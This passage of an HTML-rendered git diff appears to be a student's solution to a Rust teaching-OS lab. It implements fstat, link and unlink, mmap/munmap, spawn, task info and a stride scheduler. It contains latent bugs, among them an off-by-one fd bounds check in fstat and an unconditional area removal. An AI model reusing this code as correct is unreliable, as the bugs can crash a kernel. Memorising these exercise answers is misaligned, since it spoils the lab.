prefix unchanged"> </span><span class="token line">        user_buf.len()</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    fn get_stat(&amp;self) -> Stat &#123;</span><span class="token prefix inserted">+</span><span class="token line">        panic!("Not implemented!");</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/mm/frame_allocator.rs b/os/src/mm/frame_allocator.rsindex 44f20cd..2fa6939 100644<span class="token coord">--- a/os/src/mm/frame_allocator.rs</span><span class="token coord">+++ b/os/src/mm/frame_allocator.rs</span><span class="token coord">@@ -1,7 +1,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Implementation of [`FrameAllocator`] which</span><span class="token prefix unchanged"> </span><span class="token line">//! controls all the frames in the operating system.</span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;PhysAddr, PhysPageNum&#125;;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::MEMORY_END;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;MEMORY_END, PAGE_SIZE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec::Vec;</span><span class="token prefix unchanged"> </span><span class="token line">use core::fmt::&#123;self, Debug, Formatter&#125;;</span></span>@@ -134,3 +134,10 @@ pub fn frame_allocator_test() &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    drop(v);</span><span class="token prefix unchanged"> </span><span class="token line">    println!("frame_allocator_test passed!");</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Check if the remaining physical memory is sufficient</span><span class="token prefix inserted">+</span><span class="token line">pub fn is_mem_sufficient(_len: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">    let fa = FRAME_ALLOCATOR.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    let page_cnt = fa.end - fa.current + fa.recycled.len();</span><span class="token prefix inserted">+</span><span class="token line">    (_len + PAGE_SIZE - 1) / PAGE_SIZE &lt;= page_cnt</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>diff --git a/os/src/mm/memory_set.rs b/os/src/mm/memory_set.rsindex a5a9ede..58ac256 100644<span class="token coord">--- a/os/src/mm/memory_set.rs</span><span class="token coord">+++ b/os/src/mm/memory_set.rs</span>@@ -66,6 +66,19 @@ impl MemorySet &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            None,</span><span class="token prefix unchanged"> </span><span class="token line">        );</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// Remove framed area</span><span class="token prefix inserted">+</span><span class="token line">    pub fn remove_framed_area(&amp;mut self, range: VPNRange) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut idx = 0;</span><span class="token prefix inserted">+</span><span class="token line">        for area in self.areas.iter_mut() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if area.vpn_range.get_start().0 == range.get_start().0 </span><span class="token prefix inserted">+</span><span class="token line">                &amp;&amp; area.vpn_range.get_end().0 == range.get_end().0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">                area.unmap(&amp;mut self.page_table);</span><span class="token prefix inserted">+</span><span class="token line">                break;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">            idx += 1;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        self.areas.remove(idx);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    /// remove a area</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn remove_area_with_start_vpn(&amp;mut self, start_vpn: VirtPageNum) &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        if let Some((idx, area)) = self</span></span>diff --git a/os/src/mm/mod.rs b/os/src/mm/mod.rsindex d75c373..a2ac413 100644<span class="token coord">--- a/os/src/mm/mod.rs</span><span class="token coord">+++ b/os/src/mm/mod.rs</span>@@ -12,9 +12,10 @@ mod heap_allocator;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">mod memory_set;</span><span class="token prefix unchanged"> </span><span class="token line">mod page_table;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use address::VPNRange;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pub use address::VPNRange;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub use address::&#123;PhysAddr, PhysPageNum, StepByOne, VirtAddr, VirtPageNum&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">pub use frame_allocator::&#123;frame_alloc, frame_dealloc, FrameTracker&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pub use frame_allocator::is_mem_sufficient;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub use memory_set::remap_test;</span><span class="token prefix unchanged"> </span><span class="token line">pub use memory_set::&#123;kernel_token, MapPermission, MemorySet, KERNEL_SPACE&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use page_table::PTEFlags;</span></span>diff --git a/os/src/syscall/fs.rs b/os/src/syscall/fs.rsindex 864d6ba..b27deac 100644<span class="token coord">--- a/os/src/syscall/fs.rs</span><span class="token coord">+++ b/os/src/syscall/fs.rs</span><span class="token coord">@@ -1,5 +1,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! File and filesystem-related syscalls</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::fs::&#123;open_file, OpenFlags, Stat&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use core::mem::size_of;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use crate::fs::&#123;open_file, OpenFlags, Stat, ROOT_INODE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::mm::&#123;translated_byte_buffer, translated_str, UserBuffer&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::task::&#123;current_task, current_user_token&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -78,26 +80,55 @@ pub fn sys_close(fd: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement fstat.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_fstat(_fd: usize, _st: *mut Stat) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_fstat NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_fstat",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let inner = task.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    if _fd > inner.fd_table.len() &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    if let Some(file) = &amp;inner.fd_table[_fd] &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let file = file.clone();</span><span class="token prefix inserted">+</span><span class="token line">        drop(inner);</span><span class="token prefix inserted">+</span><span class="token line">        let stat: Stat = file.get_stat();</span><span class="token prefix inserted">+</span><span class="token line">        let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">            current_user_token(), _st as *const u8, size_of::&lt;Stat>());</span><span class="token prefix inserted">+</span><span class="token line">        let mut stat_ptr = &amp;stat as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">        for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">            unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">                stat_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">                stat_ptr = stat_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125; else &#123;</span><span class="token prefix inserted">+</span><span class="token line">        -1</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement linkat.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_linkat(_old_name: *const u8, _new_name: *const u8) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_linkat NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_linkat",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let token = current_user_token();</span><span class="token prefix inserted">+</span><span class="token line">    let _old_name = translated_str(token, _old_name);</span><span class="token prefix inserted">+</span><span class="token line">    let _new_name = translated_str(token, _new_name);</span><span class="token prefix inserted">+</span><span class="token line">    if _old_name == _new_name &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    ROOT_INODE.linkat(&amp;_old_name, &amp;_new_name)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement unlinkat.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_unlinkat(_name: *const u8) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_unlinkat NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_unlinkat",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let token = current_user_token();</span><span class="token prefix inserted">+</span><span class="token line">    let _name = translated_str(token, _name);</span><span class="token prefix inserted">+</span><span class="token line">    ROOT_INODE.unlinkat(&amp;_name)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/syscall/mod.rs b/os/src/syscall/mod.rsindex 613d44e..34197ed 100644<span class="token coord">--- a/os/src/syscall/mod.rs</span><span class="token coord">+++ b/os/src/syscall/mod.rs</span>@@ -59,8 +59,10 @@ use process::*;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use crate::fs::Stat;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::task::current_task;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// handle syscall exception with `syscall_id` and other arguments</span><span class="token prefix unchanged"> </span><span class="token line">pub fn syscall(syscall_id: usize, args: [usize; 4]) -> isize &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    current_task().unwrap().inc_syscall_times(syscall_id);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    match syscall_id &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_OPEN => sys_open(args[1] as *const u8, args[2] as u32),</span><span class="token prefix unchanged"> </span><span class="token line">        SYSCALL_CLOSE => sys_close(args[0]),</span></span>diff --git a/os/src/syscall/process.rs b/os/src/syscall/process.rsindex 316897d..974412a 100644<span class="token coord">--- a/os/src/syscall/process.rs</span><span class="token coord">+++ b/os/src/syscall/process.rs</span><span class="token coord">@@ -1,15 +1,17 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Process management syscalls</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">//!</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">use core::mem::size_of;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::Arc;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use crate::&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    config::MAX_SYSCALL_NUM,</span><span class="token prefix unchanged"> </span><span class="token line">    fs::&#123;open_file, OpenFlags&#125;,</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    mm::&#123;translated_refmut, translated_str&#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    mm::&#123;translated_byte_buffer, translated_refmut, translated_str&#125;,</span><span class="token prefix inserted">+</span><span class="token line">    mm::&#123;is_mem_sufficient, VirtAddr&#125;,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    task::&#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        add_task, current_task, current_user_token, exit_current_and_run_next,</span><span class="token prefix deleted">-</span><span class="token line">        suspend_current_and_run_next, TaskStatus,</span><span class="token prefix deleted">-</span><span class="token line">    &#125;,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        add_task, current_task, current_user_token, exit_current_and_run_next, suspend_current_and_run_next, TaskStatus</span><span class="token prefix inserted">+</span><span class="token line">    &#125;, timer::get_time_us,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#[repr(C)]</span></span>@@ -119,10 +121,24 @@ pub fn sys_waitpid(pid: isize, exit_code_ptr: *mut i32) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TimeVal`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_get_time NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_get_time",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let _us = get_time_us();</span><span class="token prefix inserted">+</span><span class="token line">    let time_val = TimeVal &#123;</span><span class="token prefix inserted">+</span><span class="token line">        sec: _us / 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">        usec: _us % 1_000_000,</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ts as *const u8, size_of::&lt;TimeVal>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut time_val_ptr = &amp;time_val as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            time_val_ptr = time_val_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Finish sys_task_info to pass testcases</span></span>@@ -130,28 +146,60 @@ pub fn sys_get_time(_ts: *mut TimeVal, _tz: usize) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: What if [`TaskInfo`] is splitted by two pages ?</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_task_info(_ti: *mut TaskInfo) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_task_info NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_task_info",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let task_info = TaskInfo &#123;</span><span class="token prefix inserted">+</span><span class="token line">        status: TaskStatus::Running,</span><span class="token prefix inserted">+</span><span class="token line">        syscall_times: current_task().unwrap().get_syscall_times(),</span><span class="token prefix inserted">+</span><span class="token line">        time: current_task().unwrap().get_scheduled_timespan(),</span><span class="token prefix inserted">+</span><span class="token line">    &#125;;</span><span class="token prefix inserted">+</span><span class="token line">    let buffers = translated_byte_buffer(</span><span class="token prefix inserted">+</span><span class="token line">        current_user_token(), _ti as *const u8, size_of::&lt;TaskInfo>());</span><span class="token prefix inserted">+</span><span class="token line">    let mut task_info_ptr = &amp;task_info as *const _ as *const u8;</span><span class="token prefix inserted">+</span><span class="token line">    for buffer in buffers &#123;</span><span class="token prefix inserted">+</span><span class="token line">        unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">            task_info_ptr.copy_to(buffer.as_mut_ptr(), buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">            task_info_ptr = task_info_ptr.add(buffer.len());</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    0</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement mmap.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_mmap(_start: usize, _len: usize, _port: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_mmap NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_mmap",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let start_va = VirtAddr::from(_start);</span><span class="token prefix inserted">+</span><span class="token line">    // 1. illegal start virtual address or port</span><span class="token prefix inserted">+</span><span class="token line">    if !start_va.aligned() || _port &amp; !0x7 != 0 || _port &amp; 0x7 == 0 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    // 2. Check is there sufficient physical memory</span><span class="token prefix inserted">+</span><span class="token line">    if !is_mem_sufficient(_len) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let end_va = VirtAddr::from(_start + _len);</span><span class="token prefix inserted">+</span><span class="token line">    current_task().unwrap().mmap(start_va, end_va, _port)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// YOUR JOB: Implement munmap.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_munmap(_start: usize, _len: usize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_munmap NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_munmap",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    let start_va = VirtAddr::from(_start);</span><span class="token prefix inserted">+</span><span class="token line">    if !start_va.aligned() &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    let end_va = VirtAddr::from(_start + _len);</span><span class="token prefix inserted">+</span><span class="token line">    current_task().unwrap().munmap(start_va, end_va)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">/// change data segment size</span></span>@@ -168,17 +216,34 @@ pub fn sys_sbrk(size: i32) -> isize &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">/// HINT: fork + exec =/= spawn</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_spawn(_path: *const u8) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_spawn NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_spawn",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    </span><span class="token prefix inserted">+</span><span class="token line">    // spawn a new process based upon _path</span><span class="token prefix inserted">+</span><span class="token line">    let token = current_user_token();</span><span class="token prefix inserted">+</span><span class="token line">    let _path = translated_str(token, _path);</span><span class="token prefix inserted">+</span><span class="token line">    let data_opt = open_file(&amp;_path, OpenFlags::RDONLY);</span><span class="token prefix inserted">+</span><span class="token line">    if data_opt.is_none() &#123;  // invalid file name</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    let current_task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let new_task = current_task.spawn(data_opt.unwrap().read_all().as_slice());</span><span class="token prefix inserted">+</span><span class="token line">    let new_pid = new_task.getpid();</span><span class="token prefix inserted">+</span><span class="token line">    add_task(new_task);</span><span class="token prefix inserted">+</span><span class="token line">    new_pid as isize</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// YOUR JOB: Set task priority.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_set_priority(_prio: isize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_set_priority NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_set_priority",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    if _prio &lt;= 1 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    let current_task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    current_task.set_prio(_prio);</span><span class="token prefix inserted">+</span><span class="token line">    _prio</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/task/manager.rs b/os/src/task/manager.rsindex 99393a4..b0f2b52 100644<span class="token coord">--- a/os/src/task/manager.rs</span><span class="token coord">+++ b/os/src/task/manager.rs</span>@@ -19,11 +19,27 @@ impl TaskManager &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    /// Add process back to ready queue</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn add(&amp;mut self, task: Arc&lt;TaskControlBlock>) &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        task.inc_stride();</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        self.ready_queue.push_back(task);</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    /// Take a process out of the ready queue</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn fetch(&amp;mut self) -> Option&lt;Arc&lt;TaskControlBlock>> &#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        self.ready_queue.pop_front()</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        // self.ready_queue.pop_front()</span><span class="token prefix inserted">+</span><span class="token line">        let mut min_stride = isize::MAX;</span><span class="token prefix inserted">+</span><span class="token line">        let mut best_idx = 0;</span><span class="token prefix inserted">+</span><span class="token line">        for (idx, tcb) in self.ready_queue.iter().enumerate() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            let stride = tcb.get_stride();</span><span class="token prefix inserted">+</span><span class="token line">            if min_stride > stride &#123;</span><span class="token prefix inserted">+</span><span class="token line">                min_stride = stride;</span><span class="token prefix inserted">+</span><span class="token line">                best_idx = idx;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        if min_stride == isize::MAX &#123;</span><span class="token prefix inserted">+</span><span class="token line">            None</span><span class="token prefix inserted">+</span><span class="token line">        &#125; else &#123;</span><span class="token prefix inserted">+</span><span class="token line">            self.ready_queue.swap(0, best_idx);</span><span class="token prefix inserted">+</span><span class="token line">            self.ready_queue.pop_front()</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/os/src/task/processor.rs b/os/src/task/processor.rsindex f05fa09..14b8ae0 100644<span class="token coord">--- a/os/src/task/processor.rs</span><span class="token coord">+++ b/os/src/task/processor.rs</span>@@ -8,6 +8,7 